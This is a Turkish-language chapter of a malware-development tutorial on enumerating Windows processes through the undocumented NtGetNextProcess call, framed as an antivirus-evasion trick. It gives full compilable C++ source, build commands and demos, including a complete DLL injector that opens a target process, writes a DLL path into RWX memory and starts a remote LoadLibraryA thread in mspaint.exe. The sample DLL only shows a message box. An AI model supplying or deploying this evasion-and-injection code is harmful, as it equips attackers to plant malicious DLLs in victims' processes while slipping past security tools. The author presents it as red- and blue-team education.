\newpage
\subsection{43.zararlı yazılım geliştirme hilesi. NtGetNextProcess ile PID'yi bulmak.Basit C++ örneği}

﷽

![av-evasion](./images/97/2023-05-26_01-02.png){width="80%"}      

Bugün, başka bir zararlı yazılım geliştirme hilesine odaklanmak istiyorum:enum process'I ve `NetGetNextProcess` ile PID'yi bulmak.Bu antivirüsten kaçmak için kullanılan yaygın zararlı yazılımlarının biridir.    

### hile nedir?

Biz sadece ek belgelenmemiş özellikleri kullanıyoruz. `NtGetNextProcess`, çekirdek tarafından sağlanan ve bir sonraki süreci getiren bir sistem çağrısıdır. Peki, 'sonraki' ne anlama geliyor? Eğer Windows'un iç yapısına aşinaysanız, işlem nesnelerinin çekirdekte büyük bir bağlı liste içinde birbirine bağlı olduğunu bilirsiniz. Bu nedenle, bu sistem çağrısı bir işlem nesnesinin tutamacını alır ve mevcut kullanıcının erişebildiği zincirdeki bir sonraki işlemi bulur.      

### pratik örnek

Her şey oldukça basit:    

```cpp
int findMyProc(const char * procname) {
  int pid = 0;
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function address
  fNtGetNextProcess myNtGetNextProcess = 
  (fNtGetNextProcess) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {
      pid = GetProcessId(current);
      break;
    }
  }

  return pid;
}
```

Bu işlev, bir Windows sisteminde çalışan tüm süreçleri tarar ve sağlanan isimle eşleşen bir sürecin Process ID'sini (PID) döndürür. Bir `while` döngüsü başlatılır ve bu döngü, `myNtGetNextProcess` sıfır olmayan bir değer döndürene kadar devam eder; bu, artık başka süreç kalmadığını gösterir.Bir sonraki sürecin tutamacı `myNtGetNextProcess` tarafından alınır ve `current` değişkeninde saklanır. Her süreç için, `GetProcessImageFileNameA` işlevi kullanılarak süreç yürütülebilir dosyasının adı alınır ve `procName` değişkeninde saklanır. `PathFindFileName` kullanılarak `procName`'in temel adı elde edilir ve `procName` ile karşılaştırılır. Karşılaştırma, `lstrcmpiA` işlevi sayesinde büyük/küçük harf duyarsız olarak yapılır. Eğer bir eşleşme bulunursa, current sürecinin PID'si elde edilir.     

Bu mantığın tam kaynak kodu şu şekildedir (`hack.cpp`):      

```cpp
/*
 * hack.cpp - find process ID by NtGetNextProcess. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html
*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

typedef NTSTATUS (NTAPI * fNtGetNextProcess)(
  _In_ HANDLE ProcessHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ ULONG HandleAttributes,
  _In_ ULONG Flags,
  _Out_ PHANDLE NewProcessHandle
);

int findMyProc(const char * procname) {
  int pid = 0;
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function address
  fNtGetNextProcess myNtGetNextProcess = 
  (fNtGetNextProcess) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {
      pid = GetProcessId(current);
      break;
    }
  }

  return pid;
}

int main(int argc, char* argv[]) {
  int pid = 0; // process ID
  pid = findMyProc(argv[1]);
  printf("%s%d\n", pid > 0 ? "process found at pid = " : 
  "process not found. pid = ", pid);
  return 0;
}
```

### demo

Tamam, şimdi bu tekniği çalışırken görelim.    

Öncelikle kodumuzu derleyelim (`hack.cpp`):    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -lpsapi -lshlwapi
```

![av-evasion](./images/97/2023-05-25_23-51.png){width="80%"}      

Daha sonra, kurbanın makinesinde (`Windows 10 22H2 x64`) çalıştırın:     

```powershell
.\hack.exe <process>
```

![av-evasion](./images/97/2023-05-26_01-03.png){width="80%"}      

Gördüğünüz gibi, beklendiği gibi mükemmel çalıştı :) =^..^=    

### pratik örnek 2: bul ve enjekte Et


Şimdi kötü amaçlı bir mantık içeren başka bir örneğe geçelim. Süreç adını kullanarak Process ID (PID) bulalım ve ona bir DLL enjekte edelim.     

Kaynak kodu, [önceki](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html) paylaşımıma benzer. Tek fark, `findMyProc` fonksiyonunun mantığında (`hack2.cpp`):     

```cpp
/*
 * hack2.cpp - find process ID
 * by NtGetNextProcess and
 * DLL inject. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2023/05/26/malware-tricks-30.html
*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

typedef NTSTATUS (NTAPI * fNtGetNextProcess)(
  _In_ HANDLE ProcessHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_ ULONG HandleAttributes,
  _In_ ULONG Flags,
  _Out_ PHANDLE NewProcessHandle
);

int findMyProc(const char * procname) {
  int pid = 0;
  HANDLE current = NULL;
  char procName[MAX_PATH];

  // resolve function address
  fNtGetNextProcess myNtGetNextProcess = 
  (fNtGetNextProcess) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");

  // loop through all processes
  while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
    GetProcessImageFileNameA(current, procName, MAX_PATH);
    if (lstrcmpiA(procname, PathFindFileName((LPCSTR) procName)) == 0) {
      pid = GetProcessId(current);
      break;
    }
  }

  return pid;
}

int main(int argc, char* argv[]) {
  int pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer
  pid = findMyProc(argv[1]);
  printf("%s%d\n", pid > 0 ? "process found at pid = " : 
  "process not found. pid = ", pid);

  HMODULE hKernel32 = GetModuleHandle("kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // open process
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
  if (ph == NULL) {
    printf("OpenProcess failed! exiting...\n");
    return -2;
  }

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT),
   PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, 
  NULL);
  CloseHandle(ph);

  return 0;
}
```

As usually, for simplicity I create simple DLL with `meow from evil.dll!` messagebox (`evil.c`):      

Her zamanki gibi, basitlik açısından `evil.dll` içinde bir `meow` mesaj kutusu içeren basit bir DLL oluşturuyorum! (`evil.c`):    

```cpp
/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow from evil.dll!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

### demo 2

Tamam, enjeksiyonumuzu gösterelim.     

Derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 hack2.cpp -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive -lpsapi -lshlwapi
```

![av-evasion](./images/97/2023-05-26_00-55.png){width="80%"}      

Ve `mspaint.exe` sürecini bulup enjekte etmek için çalıştırın:    

```powershell
.\hack2.exe mspaint.exe
```

![av-evasion](./images/97/2023-05-26_00-59.png){width="80%"}     

![av-evasion](./images/97/2023-05-26_01-01.png){width="80%"}     

Gördüğünüz gibi, mesaj kutumuz `mspaint.exe` sürecine `PID = 2568` ile beklendiği gibi enjekte edildi. Mükemmel! =^..^=     

Daha önce yazdığım gibi, bu teknik bazı siber güvenlik çözümlerini atlatmak için kullanılabilir, çünkü birçok sistem yalnızca `CreateToolhelp32Snapshot`, `Process32First`, `Process32Next` gibi yaygın olarak bilinen fonksiyonları tespit eder.     

Aynı nedenle, bu yöntem birçok kötü amaçlı yazılım analisti için zorlayıcı olabilir.
Gerçek dünyada kullanılan kötü amaçlı yazılımlar veya APT (Advanced Persistent Threats) saldırılarında bu tekniği henüz görmedim. Umarım bu gönderi, blue team üyelerinin bu ilginç kötü amaçlı yazılım geliştirme tekniği hakkında farkındalık kazanmasını sağlar ve red team üyeleri için yeni bir silah ekler.      

[Find PID by name and inject to it. "Classic" implementation.](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)       
[Classic DLL injection into the process. Simple C++ malware](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)        
[Taking a Snapchot and Viewing Processes](https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)       
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-05-26-malware-tricks-30)           
